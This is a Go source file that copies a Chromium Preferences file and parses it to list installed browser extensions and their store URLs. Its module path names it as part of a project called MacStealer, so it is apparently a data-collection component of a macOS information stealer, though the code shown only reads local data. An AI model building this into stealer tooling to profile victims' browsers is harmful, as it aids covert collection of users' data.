package browsingdata

import (
	"fmt"
	"os"
	"strings"

	"github.com/tidwall/gjson"
	"github.com/ultra-supara/MacStealer/util"
)

type ChromiumExtension []Extension

type Extension struct {
	ID          string `json:"id"`
	Name        string `json:"name"`
	Version     string `json:"version"`
	Description string `json:"description"`
	Enabled     bool   `json:"enabled"`
	HomepageURL string `json:"homepage_url"`
	StoreURL    string `json:"store_url"`
}

func GetExtension(path string) ([]Extension, error) {
	// Copy preferences file to avoid lock issues
	eFile := "./extension_temp"
	err := util.FileCopy(path, eFile)
	if err != nil {
		return nil, fmt.Errorf("Preferences FileCopy failed: %w", err)
	}
	defer os.Remove(eFile)

	content, err := os.ReadFile(eFile)
	if err != nil {
		return nil, fmt.Errorf("failed to read preferences file: %w", err)
	}

	return parseChromiumExtensions(string(content))
}

func parseChromiumExtensions(content string) ([]Extension, error) {
	// Chrome stores extensions in different paths depending on version
	settingKeys := []string{
		"extensions.settings",
		"settings.extensions",
		"settings.settings",
	}

	var settings gjson.Result
	for _, key := range settingKeys {
		settings = gjson.Parse(content).Get(key)
		if settings.Exists() {
			break
		}
	}

	if !settings.Exists() {
		return nil, fmt.Errorf("cannot find extensions in preferences")
	}

	var extensions []Extension

	settings.ForEach(func(id, ext gjson.Result) bool {
		// Skip component extensions and default extensions
		location := ext.Get("location")
		if location.Exists() {
			switch location.Int() {
			case 5, 10:
				// 5 = COMPONENT, 10 = EXTERNAL_COMPONENT
				return true
			}
		}

		enabled := !ext.Get("disable_reasons").Exists()
		manifest := ext.Get("manifest")

		if !manifest.Exists() {
			// Extension without manifest (might be removed or corrupted)
			extensions = append(extensions, Extension{
				ID:      id.String(),
				Enabled: enabled,
				Name:    ext.Get("path").String(),
			})
			return true
		}

		extensions = append(extensions, Extension{
			ID:          id.String(),
			Name:        manifest.Get("name").String(),
			Version:     manifest.Get("version").String(),
			Description: manifest.Get("description").String(),
			Enabled:     enabled,
			HomepageURL: manifest.Get("homepage_url").String(),
			StoreURL:    getChromiumExtURL(id.String(), manifest.Get("update_url").String()),
		})
		return true
	})

	return extensions, nil
}

func getChromiumExtURL(id, updateURL string) string {
	if strings.HasSuffix(updateURL, "clients2.google.com/service/update2/crx") {
		return "https://chrome.google.com/webstore/detail/" + id
	} else if strings.HasSuffix(updateURL, "edge.microsoft.com/extensionwebstorebase/v1/crx") {
		return "https://microsoftedge.microsoft.com/addons/detail/" + id
	}
	return ""
}
